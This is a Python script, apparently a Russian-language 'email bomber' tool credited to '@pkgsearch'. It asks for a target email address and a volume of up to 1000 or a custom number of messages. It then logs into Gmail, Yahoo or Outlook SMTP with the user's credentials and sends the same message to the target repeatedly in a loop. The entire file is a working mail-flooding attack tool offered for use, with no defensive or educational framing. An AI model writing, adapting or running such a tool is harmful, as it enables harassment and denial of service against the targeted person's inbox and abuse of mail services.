import smtplib
import sys
import ctypes
import colorama
from colorama import init, Fore
import os
colorama.init()
os.system("clear")

def banner():

    print(Fore.GREEN + ''' 
    ═══════════════███████
═════════════███═════███
═══════════███═════════███
══════════███══█████═█══███
═════════███══███══███═══██
═════════███═███════██═══██
═════════███═███════██══███
═════════███══██═══███══██
████████══███══█████████════████████
█══██████══███══════════██═██████══█
███══█████═══████═══████══█████══███
████═══█████═════████═══█████═══████
██████═══███████══════██████══██████
███████═══████████████████═══███████
█████████═══████████████═══█████████
██████████════████████════██████████
████████═══██══════════██═══████████
██████═══██████══════██████═══██████
█████═══█████████████████████═══████
███═══█████████████████████████═══██
██═══███████████████████████████═══█
█══██████████████████████████████══█
████████████████████████████████████
██████
 █    █
 █    █  ███   █ █ █  █████  ░███░
 █    █ █▓ ▓█  █ █ █    █    █▒ ▒█
 █    █ █   █  █ █ █    █        █
 █    █ █   █  █ █ █    █    ▒████
 █    █ █   █  █ █ █    █    █▒  █
 █    █ █▓ ▓█  █ █ █    █    █░ ▓█
 █    █  ███   █████    █    ▒██▒█
                By: @pkgsearch
    '''+ Fore.RESET)


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            self.target = str(input("Введите адрес электронной почты для атаки: "))
            self.mode = int(input( '\nВведи мод бомбера(1,2,3,4) \n| 1:(1000) 2:(500) 3:(250) 4:(custom) : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'Ой ошибка: {e}')

    def bomb(self):
        try:
            os.system('cls')
            print(Fore.LIGHTCYAN_EX+'| '+Fore.RESET+ 'Setting up the bomb'+ Fore.RESET) 
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                os.system('cls')
                self.amount = int(input('Выберите пользовательскую сумму <: '))
            print(Fore.LIGHTCYAN_EX + '| '+Fore.RESET + f'Вы выбрали режим бомбы: {self.mode} и {self.amount} электронные письма'+ Fore.RESET)
        except Exception as e:
            print(f'Ошибочка: {e}')

    def email(self):
        try:
            print(Fore.LIGHTCYAN_EX + '| '+Fore.RESET+'Настроечки емаила' + Fore.RESET)
            self.server = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Выбери сервер почты - 1:Gmail 2:Yahoo 3:Outlook: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(Fore.GREEN + 'Введи номер порта <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            os.system('cls')
            self.fromAddr = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Enter your email: '))
            self.fromPwd = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Enter your password: '))
            self.subject = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Type your subject: '))
            self.message = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Type your message: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(Fore.YELLOW + f'Бомбер: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(Fore.RED + '\nНачато')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(Fore.RED + '\nОкончание')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
